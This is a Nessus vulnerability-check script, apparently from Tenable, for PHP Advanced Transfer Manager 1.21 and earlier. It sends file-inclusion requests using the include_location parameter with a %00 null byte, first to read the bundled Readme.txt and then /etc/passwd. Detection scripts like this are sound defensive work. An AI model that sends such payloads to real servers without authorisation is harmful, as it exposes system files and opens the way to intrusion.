#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18207);
  script_version("$Revision: 1.2 $");

  script_cve_id("CAN-2005-1604");
  script_bugtraq_id(13542, 13691);

  name["english"] = "PHP Advanced Transfer Manager <= 1.21 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The version of PHP Advanced Transfer Manager installed on the remote
host allows authenticated users to upload arbitrary files and then run
them subject to the privileges of the web server user.  It also allows
unauthenticated users to read arbitrary files on the remote host and
possibly even run arbitrary PHP code, subject to the privileges of the
web server user. 

See also : http://www.securityfocus.com/archive/1/398536
           http://www.securityfocus.com/archive/1/397677
Solution : Unknown at this time.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in PHP Advanced Transfer Manager <= 1.21";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Search for phpATM.
foreach dir (cgi_dirs()) {
  # Grab index.php.
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it's phpATM.
  if (
    '<a href="http://phpatm.free.fr" target=_blank>' >< res && 
    "Powered by PHP Advanced Transfer Manager v" >< res
  ) {
    # Try to grab a file included in the distribution.
    req = http_get(
      item:string(
        dir, "/index.php?",
        # nb: try to grab the distribution's Readme.txt.
        "include_location=docs/Readme.txt%00"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # It's a problem if it looks like the Readme.txt.
    if ("remotely based upon PHP Upload Center" >< res) {
      security_hole(port);
      exit(0);
    }

    # If that failed, try to grab /etc/passwd.
    req = http_get(
      item:string(
        dir, "/index.php?",
        "include_location=/etc/passwd%00"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # It's a problem if there's an entry for root.
    if (egrep(string:res, pattern:"root:.+:0:")) {
      security_hole(port);
      exit(0);
    }
  }
}
